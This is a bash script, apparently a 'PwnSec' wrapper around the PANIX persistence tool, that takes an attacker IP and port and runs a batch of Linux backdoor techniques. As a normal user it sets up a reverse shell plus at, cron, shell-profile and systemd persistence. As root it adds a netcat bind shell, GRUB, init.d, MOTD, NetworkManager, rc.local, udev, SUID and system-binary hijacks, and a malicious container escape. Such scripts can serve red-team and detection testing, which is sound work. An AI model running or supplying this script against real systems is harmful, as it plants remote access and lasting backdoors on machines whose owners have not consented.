#!/bin/bash

echo "______                _____           ";
echo "| ___ \\              /  ___|          ";
echo "| |_/ /_      ___ __ \\ \`--.  ___  ___ ";
echo "|  __/\\ \\ /\\ / / '_ \\ \`--. \\/ _ \\/ __|";
echo "| |    \\ V  V /| | | /\\__/ /  __/ (__ ";
echo "\\_|     \\_/\\_/ |_| |_\\____/ \\___|\\___|";
echo "                                      ";
echo "                                      ";

PANIX_PATH="./panix.sh"

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m' 


if [[ $# -ne 2 ]]; then
    echo -e "${RED}Error: Invalid arguments.${NC}"
    echo "Usage: $0 <IP_ADDRESS> <PORT>"
    exit 1
fi

IP="$1"
PORT="$2"

if [ ! -x "$PANIX_PATH" ]; then
    echo -e "${RED}Error: panix.sh not found or not executable at '$PANIX_PATH'.${NC}"
    exit 1
fi


run_command() {
    local description="$1"
    shift
    local command_to_run=("$@")

    echo -e "\n${BLUE}[*] Executing: ${YELLOW}${description}${NC}"
    echo -e "    ${GREEN}Command:${NC} ${command_to_run[*]}"
    "${command_to_run[@]}"
    sleep 2 
}

execute_user_commands() {
    echo -e "\n${GREEN}--- Starting User-Level Persistence Tasks ---${NC}"

    run_command "Reverse Shell (Simple)" "$PANIX_PATH" --reverse-shell --ip "$IP" --port "$PORT"
    run_command "At Job Persistence" "$PANIX_PATH" --at --default --ip "$IP" --port "$PORT" --time "now + 2 minutes"
    run_command "Cron Job Persistence" "$PANIX_PATH" --cron --default --ip "$IP" --port "$PORT"
    run_command "Shell Profile Persistence" "$PANIX_PATH" --shell-profile --default --ip "$IP" --port "$PORT"
    run_command "Systemd (User) Service Persistence" "$PANIX_PATH" --systemd --default --ip "$IP" --port "$PORT"

    echo -e "\n${GREEN}--- User-Level Tasks Completed ---${NC}"
}

execute_root_commands() {
    echo -e "\n${GREEN}--- Starting Root-Level Persistence Tasks ---${NC}"

    run_command "Bind Shell (nc)" "sudo" "$PANIX_PATH" --bind-shell --default --lolbin --nc --port "$PORT"
    run_command "GRUB Bootloader Persistence" "sudo" "$PANIX_PATH" --grub --default --ip "$IP" --port "$PORT"
    run_command "SysV Init (init.d) Persistence" "sudo" "$PANIX_PATH" --initd --default --ip "$IP" --port "$PORT"
    run_command "Malicious Container Escape" "sudo" "$PANIX_PATH" --malicious-container --default --ip "$IP" --port "$PORT"
    run_command "MOTD Persistence" "sudo" "$PANIX_PATH" --motd --default --ip "$IP" --port "$PORT"
    run_command "NetworkManager Dispatcher Persistence" "sudo" "$PANIX_PATH" --network-manager --default --ip "$IP" --port "$PORT"
    run_command "rc.local Persistence" "sudo" "$PANIX_PATH" --rc-local --default --ip "$IP" --port "$PORT"
    run_command "SUID Binary Persistence" "sudo" "$PANIX_PATH" --suid --default
    run_command "System Binary Hijack" "sudo" "$PANIX_PATH" --system-binary --default --ip "$IP" --port "$PORT"
    run_command "Udev Rule Persistence" "sudo" "$PANIX_PATH" --udev --default --ip "$IP" --port "$PORT" --systemd

    echo -e "\n${GREEN}--- Root-Level Tasks Completed ---${NC}"
}

if [[ $EUID -eq 0 ]]; then
   # Running as root
   echo -e "${YELLOW}🚀 Running in ROOT MODE. Executing all available commands.${NC}"
   execute_user_commands
   execute_root_commands
else
   # Running as a normal user
   echo -e "${YELLOW}👤 Running in USER MODE. Executing low-privilege commands.${NC}"
   echo "   To run root commands, execute this script with 'sudo'."
   execute_user_commands
fi

echo -e "\n${GREEN}✅ All automated tasks are complete.${NC}"
